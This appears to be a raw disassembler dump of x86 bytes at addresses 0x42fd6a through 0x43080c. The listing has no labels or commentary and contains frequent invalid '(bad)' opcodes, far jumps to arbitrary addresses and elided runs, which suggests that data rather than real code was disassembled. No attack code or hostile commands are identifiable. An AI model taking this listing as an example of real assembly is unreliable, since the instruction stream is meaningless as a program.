  42fd6a:	aam    0x8d
  42fd6c:	push   es
  42fd6d:	test   al,0x35
  42fd6f:	add    eax,0xcda56eda
  42fd74:	and    DWORD PTR [ecx],ebp
  42fd76:	xor    al,0x79
  42fd78:	and    ecx,eax
  42fd7a:	loope  0x42fdd5
  42fd7c:	mov    edx,0x553113d9
  42fd81:	(bad)  
  42fd82:	push   ecx
  42fd83:	addr16 or ah,dh
  42fd86:	in     eax,dx
  42fd87:	sub    DWORD PTR [edx],ebx
  42fd89:	xor    eax,0x6ed8bda9
  42fd8e:	hlt    
  42fd8f:	scas   eax,DWORD PTR es:[edi]
  42fd90:	daa    
  42fd91:	mov    ch,bl
  42fd93:	test   al,0xe5
  42fd95:	ins    BYTE PTR es:[edi],dx
  42fd96:	add    al,0x5b
  42fd98:	stos   DWORD PTR es:[edi],eax
  42fd99:	dec    ebx
  42fd9a:	inc    edx
  42fd9b:	repz dec di
  42fd9e:	jle    0x42fdfd
  42fda0:	bound  esi,QWORD PTR [eax+eiz*4-0x250ba891]
  42fda7:	mov    bh,BYTE PTR [ecx+0x62]
  42fdaa:	pminsw mm4,QWORD PTR [ebx-0x75]
  42fdae:	imul   ebx,DWORD PTR [eax],0xffffffa9
  42fdb1:	nop
  42fdb2:	pop    ss
  42fdb3:	aad    0xe8
  42fdb5:	cli    
  42fdb6:	test   eax,0xe254c3a7
  42fdbb:	mov    bh,0xaa
  42fdbd:	enter  0x6aa8,0x6c
  42fdc1:	ins    BYTE PTR es:[edi],dx
	...
  42fe32:	add    BYTE PTR [eax],al
  42fe34:	ret    
  42fe35:	add    cl,BYTE PTR [eax]
  42fe37:	xor    eax,0xf6ff3fc9
  42fe3c:	xchg   esi,eax
  42fe3d:	fwait
  42fe3e:	bound  ebx,QWORD PTR [esi]
  42fe40:	stos   DWORD PTR es:[edi],eax
  42fe41:	fxtract 
  42fe43:	ins    BYTE PTR es:[edi],dx
  42fe44:	dec    esp
  42fe45:	cli    
  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	test   BYTE PTR [eax],0x0
  42fe4b:	add    BYTE PTR [edi],al
  42fe4d:	stos   BYTE PTR es:[edi],al
  42fe4e:	loop   0x42fe7e
  42fe50:	fist   WORD PTR [ebp-0x69]
  42fe53:	je     0x42fed4
  42fe55:	inc    edi
  42fe56:	in     al,dx
  42fe57:	sti    
  42fe58:	(bad)  
  42fe5a:	and    bh,ch
  42fe5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe5d:	sub    bh,BYTE PTR [esi-0x16]
  42fe60:	inc    ebp
  42fe61:	jno    0x42fe04
  42fe63:	sbb    DWORD PTR [ecx],ebx
  42fe65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fe66:	jbe    0x42fdfe
  42fe68:	xchg   edx,eax
  42fe69:	pop    edi
  42fe6a:	not    DWORD PTR [esi+0x42536753]
  42fe70:	push   esp
  42fe71:	dec    esi
  42fe72:	call   DWORD PTR [eax+edi*8-0x4fe59ce9]
  42fe79:	mov    esp,0x447e09c2
  42fe7e:	jmp    0xc796:0xee14ef45
  42fe85:	mov    WORD PTR [edx-0x62],?
  42fe88:	sub    dl,bh
  42fe8a:	sub    BYTE PTR [esi-0x27edc6be],bh
  42fe90:	js     0x42fedf
  42fe92:	adc    al,0x52
  42fe94:	inc    esi
  42fe95:	xchg   esp,eax
  42fe96:	push   ecx
  42fe97:	mov    ch,0xf1
  42fe99:	mov    cl,0x89
  42fe9b:	cld    
  42fe9c:	jne    0x42fe4d
  42fe9e:	sbb    bh,BYTE PTR [edx+0x5171954f]
  42fea4:	fisttp QWORD PTR [esp+edx*1+0x633b0271]
  42feab:	outs   dx,DWORD PTR ds:[esi]
  42feac:	and    edx,DWORD PTR [esp+ebp*1]
  42feaf:	or     dl,ch
  42feb1:	xor    eax,0x4c74f753
  42feb6:	adc    bh,BYTE PTR [edx+0x70325316]
  42febc:	push   ebp
  42febd:	sti    
  42febe:	out    dx,al
  42febf:	sub    ebx,DWORD PTR [eax-0x2bceb581]
  42fec5:	mov    al,0xba
  42fec7:	retf   0xe33a
  42feca:	dec    esi
  42fecb:	mov    eax,ds:0xbfeb7a3b
  42fed0:	mov    ch,0xba
  42fed2:	hlt    
  42fed3:	or     dl,BYTE PTR [eax-0x43]
  42fed6:	dec    ebp
  42fed7:	daa    
  42fed8:	cmp    BYTE PTR [eax],ch
  42feda:	xor    dl,BYTE PTR ds:0xb89e75ff
  42fee0:	push   cs
  42fee1:	or     BYTE PTR [ebx-0x5b716537],dl
  42fee7:	add    cl,BYTE PTR [esi+0x5c70a219]
  42feed:	mov    eax,ds:0x9a9a03d8
  42fef2:	inc    ebx
  42fef3:	mov    cl,0x4e
  42fef5:	and    eax,0xd170b8ea
  42fefa:	sbb    cl,0xf4
  42fefd:	adc    BYTE PTR [eax+0x5fbd7b21],0xd0
  42ff04:	inc    ecx
  42ff05:	xor    bl,BYTE PTR [ecx]
  42ff07:	outs   dx,DWORD PTR ds:[esi]
  42ff08:	xchg   bl,cl
  42ff0a:	stos   DWORD PTR es:[edi],eax
  42ff0b:	xor    al,0x4d
  42ff0d:	int3   
  42ff0e:	xor    ebx,esi
  42ff10:	jg     0x42fea5
  42ff12:	scas   eax,DWORD PTR es:[edi]
  42ff13:	fs (bad) 
  42ff15:	cld    
  42ff16:	dec    esp
  42ff17:	neg    DWORD PTR [ecx+0x78]
  42ff1a:	dec    esp
  42ff1b:	add    ebp,ebx
  42ff1d:	out    dx,al
  42ff1e:	bnd jnp 0x42ff88
  42ff21:	cmp    esp,DWORD PTR [edi+0x5b]
  42ff24:	rcr    cl,0x36
  42ff27:	add    al,0xc2
  42ff29:	sbb    dh,BYTE PTR [eax+0x1bc258c8]
  42ff2f:	jae    0x42ff67
  42ff31:	cmc    
  42ff32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ff33:	(bad)  
  42ff34:	sub    esi,DWORD PTR [esi+0x5a8ce45a]
  42ff3a:	bound  eax,QWORD PTR [edx-0x2d]
  42ff3d:	xor    DWORD PTR [edx+0x3c],esp
  42ff40:	outs   dx,DWORD PTR ds:[esi]
  42ff41:	outs   dx,BYTE PTR ds:[esi]
	...
  42ffb2:	add    BYTE PTR [eax],al
  42ffb4:	adc    bh,BYTE PTR [esi]
  42ffb6:	int    0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx-0x41768016]
  42ffc1:	sub    al,0xf6
  42ffc3:	daa    
  42ffc4:	inc    edx
  42ffc5:	sti    
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	test   BYTE PTR [eax],0x0
  42ffcb:	add    BYTE PTR [edi],bh
  42ffcd:	pop    eax
  42ffce:	mov    esi,0x1071f2b8
  42ffd3:	jae    0x42ffba
  42ffd5:	xchg   ebp,eax
  42ffd6:	cmp    ebp,DWORD PTR [esi-0x51]
  42ffd9:	inc    ebp
  42ffda:	fwait
  42ffdb:	mov    ch,0x37
  42ffdd:	outs   dx,BYTE PTR ds:[esi]
  42ffde:	mov    BYTE PTR cs:[eax],dl
  42ffe1:	fst    QWORD PTR [edi-0x1]
  42ffe4:	mov    eax,ds:0x52bbf2b2
  42ffe9:	cmc    
  42ffea:	cs js  0x42ff74
  42ffed:	sub    al,0xa8
  42ffef:	and    eax,0xfbfa3f66
  42fff4:	dec    edi
  42fff5:	(bad)  
  42fff6:	cmc    
  42fff7:	xor    ebp,DWORD PTR ds:0x4e5ebc4f
  42fffd:	std    
  42fffe:	jae    0x430068
  430000:	dec    edx
  430001:	lock lds edx,FWORD PTR [ebx]
  430004:	add    al,0xb1
  430006:	pop    ecx
  430007:	or     BYTE PTR [ecx+edx*8],0xba
  43000b:	xlat   BYTE PTR ds:[ebx]
  43000c:	sbb    esp,0x1
  43000f:	add    dh,0x58
  430012:	fucomp st(0)
  430014:	mov    eax,ds:0x35375006
  430019:	into   
  43001a:	sub    DWORD PTR [esi],ebx
  43001c:	fistp  DWORD PTR [ebp-0x5d072ae1]
  430022:	outs   dx,DWORD PTR ds:[esi]
  430023:	mov    ch,0xf4
  430025:	xchg   ebp,eax
  430026:	hlt    
  430027:	xor    al,0x5d
  430029:	fnstcw WORD PTR [esi-0xf]
  43002c:	mov    cl,0x1e
  43002e:	stos   BYTE PTR es:[edi],al
  43002f:	jmp    0x356655
  430034:	jne    0x42fff3
  430036:	cld    
  430037:	xchg   esp,eax
  430039:	(bad)  
  43003a:	pop    esi
  43003b:	mov    al,ds:0xe5f68921
  430040:	pop    ds
  430041:	add    esi,DWORD PTR [eax+0x56]
  430044:	cs adc al,0x96
  430047:	aaa    
  430048:	xlat   BYTE PTR ds:[ebx]
  430049:	push   esi
  43004a:	(bad)  
  43004b:	dec    ebp
  43004c:	pop    edx
  43004d:	ret    0x3644
  430050:	outs   dx,DWORD PTR ds:[esi]
  430051:	or     DWORD PTR [edi],esi
  430053:	mov    cl,0xf1
  430055:	ret    
  430056:	push   ebx
  430057:	pop    edi
  430058:	sub    ch,bl
  43005a:	add    BYTE PTR ds:0x35df31d7,0x50
  430061:	push   ecx
  430062:	mov    dl,0x17
  430064:	pop    ebx
  430065:	mov    edx,0x9c25fb0b
  43006a:	mov    bh,0x35
  43006c:	xor    eax,0x18cc8f07
  430071:	jne    0x43007f
  430073:	(bad)  
  430074:	iret   
  430075:	fld    DWORD PTR [edi-0x1ef0d7fe]
  43007b:	loop   0x4300f6
  43007d:	scas   eax,DWORD PTR es:[edi]
  43007e:	jno    0x430030
  430080:	push   ds
  430081:	clc    
  430082:	add    eax,0x99324fe7
  430087:	retf   0x9420
  43008a:	and    al,0xa1
  43008c:	adc    ecx,esi
  43008e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43008f:	lods   al,BYTE PTR ds:[esi]
  430090:	(bad)  
  430091:	push   0x82b71807
  430096:	push   esi
  430097:	mov    ds:0x36c512f0,al
  43009c:	not    DWORD PTR [ecx]
  43009e:	pop    edx
  43009f:	fbld   TBYTE PTR [edi-0x441aed15]
  4300a5:	mov    ds:0x1ce0623d,eax
  4300aa:	mov    ecx,0xaec73649
  4300af:	sub    BYTE PTR [eax],al
  4300b1:	ficomp DWORD PTR ds:0xe240300d
  4300b7:	sbb    DWORD PTR ds:0x2252d805,ebp
  4300bd:	jmp    0xd370e006
	...
  430132:	add    BYTE PTR [eax],al
  430134:	pop    edx
  430135:	es jecxz 0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0xa225:0x923ca608
  430144:	cmp    ah,bh
  430146:	add    DWORD PTR [eax],eax
  430148:	test   BYTE PTR [eax],0x0
  43014b:	add    al,ah
  43014d:	sbb    edx,DWORD PTR ds:0x9b330f43
  430153:	pop    ds
  430154:	test   al,0x73
  430156:	pop    esi
  430157:	retf   
  430158:	rcl    BYTE PTR [ecx-0x6c],0xe3
  43015c:	pop    es
  43015d:	sbb    al,ch
  43015f:	mov    edi,0x2eb6117c
  430164:	ins    BYTE PTR es:[edi],dx
  430165:	repz xor edi,esi
  430168:	push   ecx
  430169:	jmp    0x4301cb
  43016b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43016c:	add    DWORD PTR [eax+eax*4-0x30],ebp
  430170:	aam    0xb4
  430172:	ret    
  430173:	mov    esi,0x747eb37a
  430178:	sub    DWORD PTR [ebx-0x4c],ebx
  43017b:	(bad)  
  43017c:	adc    ecx,DWORD PTR [ebp-0x1b049d9c]
  430182:	jo     0x4301a9
  430184:	frstor [ebp-0x1f]
  430187:	int    0x86
  430189:	dec    edx
  43018a:	hlt    
  43018b:	push   eax
  43018c:	inc    eax
  43018d:	pushf  
  43018e:	adc    ecx,DWORD PTR [eax-0x28a69f3a]
  430194:	adc    BYTE PTR [ebp-0x77cb9ce3],dh
  43019a:	sub    eax,0xeac8990e
  43019f:	daa    
  4301a0:	mov    eax,0x248409c1
  4301a5:	mov    al,0xf8
  4301a7:	repnz adc DWORD PTR [eax],ebp
  4301aa:	xchg   edi,eax
  4301ab:	aas    
  4301ac:	or     al,0x37
  4301ae:	sahf   
  4301af:	in     al,0x5f
  4301b1:	out    dx,al
  4301b2:	repnz out dx,eax
  4301b4:	and    ch,dl
  4301b6:	mov    bl,0x8d
  4301b8:	mov    edi,0xf599c0d7
  4301bd:	and    eax,0x30a3656c
  4301c2:	int    0x51
  4301c4:	jne    0x430147
  4301c6:	sti    
  4301c7:	xor    al,0xcf
  4301c9:	dec    eax
  4301ca:	mov    cl,0x7a
  4301cc:	xchg   edx,eax
  4301cd:	or     DWORD PTR ds:0xe894ef93,esp
  4301d3:	mov    eax,0xf13370b4
  4301d8:	sbb    DWORD PTR [eax],ecx
  4301da:	sbb    esi,0xbff6a6fe
  4301e0:	pop    edi
  4301e1:	jb     0x4301de
  4301e3:	adc    BYTE PTR ds:0xc5c5302,bh
  4301e9:	imul   esi,DWORD PTR [esi-0x11370fe9],0x28
  4301f0:	lods   al,BYTE PTR ds:[esi]
  4301f1:	dec    esi
  4301f2:	sahf   
  4301f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301f4:	pop    es
  4301f5:	retf   0x946f
  4301f8:	in     eax,dx
  4301f9:	jl     0x4301ac
  4301fb:	adc    ah,ch
  4301fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4301fe:	dec    eax
  4301ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430200:	xchg   edi,eax
  430201:	or     edx,DWORD PTR [esi]
  430203:	jmp    0xb85c:0x4de37cc4
  43020a:	jo     0x4301df
  43020c:	rol    DWORD PTR [edi],0xf6
  43020f:	jmp    0x186a979a
  430214:	xor    al,0x49
  430216:	xor    DWORD PTR [ecx-0x7dbc2eef],edi
  43021c:	push   edx
  43021d:	retf   0x6594
  430220:	add    dh,BYTE PTR [eax-0x2cfb52fb]
  430226:	shr    DWORD PTR [edi+0x1],0xbb
  43022a:	div    BYTE PTR [esp+ecx*8-0x39]
  43022e:	popa   
  43022f:	push   ds
  430230:	rcl    BYTE PTR [ebp-0x4a],0x91
  430234:	jge    0x430249
  430236:	dec    ebx
  430237:	add    BYTE PTR [ecx+0x644ce3a5],al
  43023d:	xchg   edx,eax
  43023e:	enter  0xf0a4,0xe3
	...
  4302b2:	add    BYTE PTR [eax],al
  4302b4:	mov    ebp,0xaf8a081a
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	ret    0x9a8a
  4302c3:	dec    esp
  4302c4:	cs std 
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	test   BYTE PTR [eax],0x0
  4302cb:	add    BYTE PTR ds:0x1c059572,cl
  4302d1:	rol    DWORD PTR [ecx],0x33
  4302d4:	jle    0x430348
  4302d6:	retf   
  4302d7:	mov    es,WORD PTR [edi-0x1e849685]
  4302dd:	aam    0xeb
  4302df:	ret    0xc994
  4302e2:	ror    DWORD PTR [esi-0x6e],1
  4302e5:	adc    ecx,esp
  4302e7:	mov    eax,0xe653b3ed
  4302ec:	mov    BYTE PTR [ecx-0xd],ch
  4302ef:	retf   
  4302f0:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4302f2:	test   bl,al
  4302f4:	aaa    
  4302f5:	loope  0x430327
  4302f7:	pand   mm3,QWORD PTR [ebx]
  4302fa:	inc    ebp
  4302fb:	push   ebp
  4302fc:	push   ecx
  4302fd:	cs mov al,0x8f
  430300:	mov    ch,0xe7
  430302:	xchg   DWORD PTR [ebx],eax
  430304:	adc    eax,0x4d4d9c29
  430309:	clc    
  43030a:	add    DWORD PTR [edx],0xa6c80d66
  430310:	jp     0x430322
  430312:	inc    ebx
  430313:	sub    eax,DWORD PTR [edi]
  430315:	aaa    
  430316:	cmp    eax,0x6a19493d
  43031b:	scas   al,BYTE PTR es:[edi]
  43031c:	push   edi
  43031e:	xor    esp,DWORD PTR [edi+0x56a2bd3d]
  430324:	jbe    0x4302ab
  430326:	xchg   esp,eax
  430327:	(bad)  [esi+0x7d]
  43032a:	jae    0x430383
  43032c:	jmp    0x206def92
  430331:	stc    
  430332:	pop    ebx
  430333:	push   ss
  430334:	add    al,0xd0
  430337:	cli    
  430338:	jp     0x430391
  43033a:	jmp    0x86de:0x92b1e0bc
  430341:	fs jge 0x430339
  430344:	mov    bh,0xfc
  430346:	inc    esp
  430347:	push   edx
  430348:	loop   0x4303ab
  43034a:	sbb    BYTE PTR [edi+0x3460c85],dl
  430350:	ins    BYTE PTR es:[edi],dx
  430351:	mov    ebp,0x8f587b4c
  430356:	dec    esp
  430357:	xchg   DWORD PTR [ebp+0x79],edx
  43035a:	push   ss
  43035b:	imul   edi,DWORD PTR [edx+0x5f],0x1
  43035f:	mov    dh,0x41
  430361:	push   esi
  430362:	cmp    ah,bh
  430364:	sub    al,0x55
  430366:	pop    edx
  430367:	je     0x4303ac
  430369:	mov    ds:0xcba9f650,al
  43036e:	xor    al,0x2d
  430370:	shld   DWORD PTR [edi+0x20],edi,cl
  430374:	test   BYTE PTR [esi+0x2e197f80],bl
  43037a:	mul    DWORD PTR [eax-0x5873b1ae]
  430380:	mov    edi,0x45884353
  430385:	cdq    
  430386:	repnz mov ds:0x5cc65e80,eax
  43038c:	mov    ecx,0x527aca68
  430391:	xor    DWORD PTR [ebx],0xffffffc9
  430394:	in     eax,0x27
  430396:	arpl   WORD PTR [esi],di
  430398:	ret    0x2588
  43039b:	and    al,0x38
  43039d:	xor    eax,0x9e78a4d8
  4303a2:	dec    ecx
  4303a3:	test   al,0xa5
  4303a5:	daa    
  4303a6:	fdiv   DWORD PTR [edi+0x79413a97]
  4303ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4303ad:	(bad)  [ecx+0x1e921f20]
  4303b3:	std    
  4303b4:	push   edx
  4303b5:	xor    esp,DWORD PTR [edi-0x448d0a2]
  4303bb:	into   
  4303bc:	push   es
  4303bd:	jmp    0x0:0x5fb702e9
	...
  430434:	aaa    
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfe24:0xd717b253
  430446:	add    DWORD PTR [eax],eax
  430448:	test   BYTE PTR [eax],0x0
  43044b:	add    BYTE PTR [ebp-0x6f],al
  43044e:	jmp    0x43049e
  430450:	add    al,0x46
  430452:	or     eax,0x81e0fe22
  430457:	sbb    DWORD PTR [ebp-0x43],0x6b4d24f1
  43045e:	mov    cl,0x58
  430460:	ret    0xdc26
  430463:	aam    0xc3
  430465:	xor    DWORD PTR [edi+0x7b],0x50
  430469:	pop    es
  43046a:	cmp    ebp,esp
  43046c:	retf   
  43046d:	fild   QWORD PTR [ebx-0xd]
  430470:	int    0xa8
  430472:	bound  eax,QWORD PTR [esi-0x11c4dc32]
  430478:	or     ebp,DWORD PTR [esi-0x49]
  43047b:	and    BYTE PTR [ebp+0x71],cl
  43047e:	lahf   
  43047f:	xchg   edx,eax
  430480:	adc    eax,0x24c1d6a3
  430485:	aaa    
  430486:	add    eax,0xe235df0e
  43048b:	fcmove st,st(2)
  43048d:	into   
  43048e:	inc    ecx
  43048f:	loopne 0x4304b4
  430491:	cmp    ecx,esp
  430493:	add    edi,DWORD PTR [ebp+0x2d]
  430496:	mov    ecx,0xfd4d66be
  43049b:	xor    ah,BYTE PTR [eax+0x48e36bd7]
  4304a1:	mov    ebx,0x1d92ccfd
  4304a6:	hlt    
  4304a7:	pop    es
  4304a8:	inc    ecx
  4304a9:	outs   dx,BYTE PTR ds:[esi]
  4304aa:	aaa    
  4304ab:	clc    
  4304ac:	adc    eax,0xa84f49ce
  4304b1:	pop    ss
  4304b2:	lahf   
  4304b3:	stos   DWORD PTR es:[edi],eax
  4304b4:	sar    esi,cl
  4304b6:	call   ebx
  4304b8:	pop    es
  4304b9:	adc    eax,ebx
  4304bb:	fdivr  DWORD PTR [esi]
  4304bd:	adc    BYTE PTR [ecx+0x8],bl
  4304c0:	jg     0x430539
  4304c2:	lods   al,BYTE PTR ds:[esi]
  4304c3:	sub    edx,DWORD PTR [esi+0x37]
  4304c6:	lds    ebp,FWORD PTR [ebp+0x71]
  4304c9:	sar    dl,1
  4304cb:	pop    esi
  4304cc:	int    0x80
  4304ce:	sub    eax,0xc2706945
  4304d3:	shr    DWORD PTR [esi-0x8],0x18
  4304d7:	jmp    0x43051e
  4304d9:	(bad)  
  4304da:	push   esp
  4304db:	add    ebp,DWORD PTR [edx]
  4304dd:	stos   DWORD PTR es:[edi],eax
  4304de:	sub    eax,eax
  4304e0:	dec    edx
  4304e1:	test   al,0x3d
  4304e3:	loopne 0x430492
  4304e5:	mov    esp,0xc80c8f52
  4304ea:	mov    DWORD PTR ds:0x75dc107,edx
  4304f0:	cli    
  4304f1:	mov    eax,0x6fc9378
  4304f6:	mov    edi,DWORD PTR [eax]
  4304f8:	cdq    
  4304f9:	ja     0x430562
  4304fb:	and    bh,BYTE PTR [eax+0x38]
  4304fe:	test   al,0x67
  430500:	es (bad) 
  430502:	aas    
  430503:	dec    ebx
  430504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430505:	es jmp 0x43057c
  430508:	aam    0x9e
  43050a:	arpl   WORD PTR [ecx],si
  43050c:	jecxz  0x430588
  43050e:	bound  edi,QWORD PTR [eax]
  430510:	push   cs
  430511:	aam    0x87
  430513:	pop    esp
  430514:	enter  0x349,0x7b
  430518:	in     al,0x61
  43051a:	mov    cl,0xcd
  43051c:	mov    bh,bl
  43051e:	mov    ebp,0xd9ebe5dc
  430523:	imul   ecx,DWORD PTR [edx-0x7e],0xffffff8a
  430527:	out    0x2a,al
  430529:	(bad)  
  43052a:	xchg   ecx,eax
  43052b:	mov    cl,0xda
  43052d:	pop    esi
  43052e:	cmc    
  43052f:	loop   0x430544
  430531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430532:	xchg   ebx,eax
  430533:	xor    DWORD PTR [ebx-0x52347c57],0x2d088c9
  43053d:	das    
  43053e:	cmp    BYTE PTR [edi+0x7994],dh
	...
  4305b4:	ds push esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi-0x62]
  4305c1:	sub    DWORD PTR [edi+0x1ff1a3d],0xf600
  4305cb:	add    BYTE PTR [esi],ah
  4305cd:	call   0x1e2e58fd
  4305d2:	or     ecx,edx
  4305d4:	pop    es
  4305d5:	sub    al,0xbd
  4305d7:	adc    ebp,edi
  4305d9:	test   BYTE PTR [edi],bl
  4305db:	adc    edi,DWORD PTR [esi]
  4305dd:	ins    BYTE PTR es:[edi],dx
  4305de:	(bad)  
  4305e0:	test   eax,0xcfbda4fc
  4305e5:	push   0x629a6b1c
  4305ea:	ret    
  4305eb:	test   eax,0x1f0a8444
  4305f0:	mov    edi,0x54b952c4
  4305f5:	cli    
  4305f6:	(bad)  
  4305f7:	add    esi,DWORD PTR [ecx]
  4305f9:	lahf   
  4305fa:	bound  ecx,QWORD PTR [ecx]
  4305fc:	in     al,dx
  4305fd:	mov    ds:0x974114a2,al
  430602:	sub    eax,0xd02770eb
  430607:	test   eax,0xf2892d57
  43060c:	jbe    0x4305b1
  43060e:	jb     0x4305fd
  430610:	sti    
  430611:	inc    esi
  430612:	ins    BYTE PTR es:[edi],dx
  430613:	(bad)  
  430614:	fistp  WORD PTR [eax+0x5f]
  430617:	sbb    eax,0x2f40fe99
  43061c:	cmp    BYTE PTR [edi],ch
  43061e:	jmp    0x890a33cd
  430623:	xor    edx,DWORD PTR [esi]
  430625:	bsr    ecx,DWORD PTR [esi-0x1f3aabf4]
  43062c:	ins    DWORD PTR es:[edi],dx
  43062d:	jecxz  0x430609
  43062f:	in     eax,0x61
  430631:	pop    esi
  430632:	call   0x6e1e56f2
  430637:	add    al,0x9f
  430639:	imul   ebx,eax,0xdabfc6bb
  43063f:	out    dx,eax
  430640:	ss add ch,bh
  430643:	jg     0x430675
  430645:	jg     0x4305d6
  430647:	in     al,0xc6
  430649:	retf   
  43064a:	ins    BYTE PTR es:[edi],dx
  43064b:	repz adc dl,BYTE PTR [edx-0x41]
  43064f:	ins    DWORD PTR es:[edi],dx
  430650:	pop    esp
  430651:	(bad)  
  430652:	pop    eax
  430653:	push   0xffffffe3
  430655:	fwait
  430656:	mov    cl,0x38
  430658:	iret   
  430659:	mov    edx,0x4ebe7fd8
  43065e:	sub    dh,BYTE PTR [ebx]
  430660:	pop    es
  430661:	enter  0xfa3b,0x63
  430665:	push   0xffffffbb
  430667:	lea    esp,[esp+edi*1]
  43066a:	ret    0x1cb2
  43066d:	rol    DWORD PTR [esi+ecx*1],cl
  430670:	hlt    
  430671:	jge    0x430674
  430673:	(bad)  
  430674:	cmp    DWORD PTR [edi+0x7a],ebp
  430677:	jo     0x15a418c1
  43067d:	icebp  
  43067e:	push   ebp
  43067f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430680:	add    BYTE PTR [esi],0xd1
  430683:	in     eax,dx
  430684:	lods   eax,DWORD PTR ds:[esi]
  430685:	addr16 add ebp,esi
  430688:	loope  0x4306f4
  43068a:	into   
  43068b:	aad    0x7
  43068d:	jo     0x4306b7
  43068f:	pusha  
  430690:	daa    
  430691:	imul   ecx,edx,0xffffff81
  430694:	mov    edx,0xd42d67b5
  430699:	jo     0x4306cd
  43069b:	sbb    BYTE PTR [ecx],0xc1
  43069e:	push   0xffffffe0
  4306a0:	add    DWORD PTR [ecx+esi*2-0x50],ecx
  4306a4:	and    eax,DWORD PTR [ebp+0xbbb53b2]
  4306aa:	in     al,dx
  4306ab:	sti    
  4306ac:	scas   al,BYTE PTR es:[edi]
  4306ad:	push   eax
  4306ae:	jnp    0x4306bd
  4306b0:	and    dl,BYTE PTR [esi-0xe]
  4306b3:	repnz addr16 cwde 
  4306b6:	jg     0x430722
  4306b8:	ret    0xf4fe
  4306bb:	hlt    
  4306bc:	retf   
  4306bd:	icebp  
  4306be:	dec    edi
  4306bf:	jno    0x4306dd
  4306c1:	xchg   DWORD PTR [eax],eax
	...
  430733:	add    BYTE PTR [ecx-0x5f],dh
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0x30
  430741:	(bad)  
  430742:	fmul   DWORD PTR [eax+edx*1]
  430745:	add    BYTE PTR [edx],al
  430747:	add    dh,dh
  430749:	add    BYTE PTR [eax],al
  43074b:	add    BYTE PTR [edi-0x7c0bda52],dl
  430751:	lock sbb DWORD PTR es:[bx+si+0x5c4d],0xfffffff7
  430759:	add    eax,0xfd71b737
  43075e:	pop    edi
  43075f:	outs   dx,BYTE PTR ds:[esi]
  430760:	hlt    
  430761:	mov    al,BYTE PTR [ecx]
  430763:	add    bh,bh
  430765:	mov    esi,esp
  430767:	aaa    
  430768:	test   BYTE PTR [edi-0x2],bh
  43076b:	dec    edi
  43076c:	or     BYTE PTR [esi-0x48],dl
  43076f:	mov    ch,0x12
  430771:	sar    ah,cl
  430773:	(bad)  
  430774:	jno    0x430778
  430776:	push   ecx
  430777:	jp     0x4307a8
  430779:	aam    0x9b
  43077b:	dec    edx
  43077c:	(bad)  
  43077d:	push   0xffffffda
  43077f:	or     BYTE PTR [eax+0x4b],cl
  430782:	loopne 0x430786
  430784:	push   ebp
  430785:	push   cs
  430786:	mov    eax,ds:0x27aba3a5
  43078b:	mov    ebx,0xfc147a37
  430790:	add    ch,BYTE PTR [ecx-0x69eed730]
  430796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430797:	mov    ch,0x99
  430799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43079a:	arpl   dx,cx
  43079c:	xor    ch,BYTE PTR [ebp+0x2aed2357]
  4307a2:	jne    0x4307bd
  4307a4:	jl     0x430754
  4307a6:	pushf  
  4307a7:	cld    
  4307a8:	mov    edx,0xa024361b
  4307ad:	jg     0x43074d
  4307af:	sub    al,0xe8
  4307b1:	in     al,dx
  4307b2:	inc    ebp
  4307b3:	mov    bh,0x82
  4307b5:	int3   
  4307b6:	jge    0x430757
  4307b8:	dec    ebp
  4307b9:	mov    ebp,cr1
  4307bc:	cmp    BYTE PTR [edx],al
  4307be:	xor    eax,0x6a4e1660
  4307c3:	xchg   edi,eax
  4307c4:	stos   DWORD PTR es:[edi],eax
  4307c5:	gs addr16 (bad) 
  4307c8:	inc    ecx
  4307c9:	pop    esi
  4307ca:	add    BYTE PTR [edx+0x71ecc589],bh
  4307d0:	add    BYTE PTR [ecx+0x36],al
  4307d3:	xchg   edi,eax
  4307d4:	dec    ebx
  4307d5:	loop   0x4307f9
  4307d7:	loopne 0x4307a5
  4307d9:	int3   
  4307da:	cli    
  4307db:	nop
  4307dc:	pusha  
  4307dd:	iret   
  4307de:	dec    ecx
  4307df:	lock (bad) 
  4307e2:	lahf   
  4307e3:	jno    0x430852
  4307e5:	imul   esp,DWORD PTR [esi-0x68],0xffffff86
  4307e9:	sbb    al,0x19
  4307eb:	sub    BYTE PTR [edx],0x3b
  4307ee:	dec    esp
  4307ef:	in     eax,dx
  4307f0:	and    al,0xa5
  4307f2:	mov    esp,0x33bd404e
  4307f7:	(bad)  
  4307f9:	adc    DWORD PTR [ecx-0x1445efc1],edi
  4307ff:	mov    dh,0x36
  430801:	xor    BYTE PTR [ebp-0x45d14458],dh
  430807:	mov    al,ds:0xcc8515f5
  43080c:	scas   eax,DWORD PTR es:[edi]
